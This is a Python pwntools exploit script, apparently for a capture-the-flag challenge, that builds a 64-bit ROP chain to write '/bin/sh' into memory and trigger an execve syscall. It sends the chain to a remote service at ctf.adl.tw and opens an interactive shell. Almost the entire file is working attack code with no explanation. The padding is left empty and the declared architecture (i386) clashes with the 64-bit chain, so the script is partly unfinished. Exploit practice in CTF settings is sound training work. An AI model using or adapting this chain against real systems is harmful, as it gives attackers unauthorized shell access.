from pwn import * 
from struct import pack

# Padding goes here
p = b''

p += pack('<Q', 0x0000000000410713) # pop rsi ; ret
p += pack('<Q', 0x00000000006ba0e0) # @ .data
p += pack('<Q', 0x000000000044a30c) # pop rax ; ret
p += b'/bin/sh'
p += pack('<Q', 0x00000000004801d1) # mov qword ptr [rsi], rax ; ret
p += pack('<Q', 0x0000000000410713) # pop rsi ; ret
p += pack('<Q', 0x00000000006ba0e8) # @ .data + 8
p += pack('<Q', 0x00000000004452b0) # xor rax, rax ; ret
p += pack('<Q', 0x00000000004801d1) # mov qword ptr [rsi], rax ; ret
p += pack('<Q', 0x0000000000400696) # pop rdi ; ret
p += pack('<Q', 0x00000000006ba0e0) # @ .data
p += pack('<Q', 0x0000000000410713) # pop rsi ; ret
p += pack('<Q', 0x00000000006ba0e8) # @ .data + 8
p += pack('<Q', 0x000000000044a365) # pop rdx ; ret
p += pack('<Q', 0x00000000006ba0e8) # @ .data + 8
p += pack('<Q', 0x00000000004452b0) # xor rax, rax ; ret
p += pack('<Q', 0x0000000000475660) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000475660) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000475660) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000475660) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000475660) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000475660) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000475660) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000475660) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000475660) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000475660) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000475660) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000475660) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000475660) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000475660) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000475660) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000475660) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000475660) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000475660) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000475660) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000475660) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000475660) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000475660) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000475660) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000475660) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000475660) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000475660) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000475660) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000475660) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000475660) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000475660) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000475660) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000475660) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000475660) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000475660) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000475660) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000475660) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000475660) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000475660) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000475660) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000475660) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000475660) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000475660) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000475660) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000475660) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000475660) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000475660) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000475660) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000475660) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000475660) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000475660) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000475660) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000475660) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000475660) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000475660) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000475660) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000475660) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000475660) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000475660) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000475660) # add rax, 1 ; ret
p += pack('<Q', 0x000000000040132c) # syscall
#print len(p)
#print(p)
context(arch = 'i386', os = 'linux')
#r = process('./ec')
r = remote('ctf.adl.tw', 11006)
# EXPLOIT CODE GOES HERE
#r.recvline()
r.send(p)
r.recvline()
r.interactive()
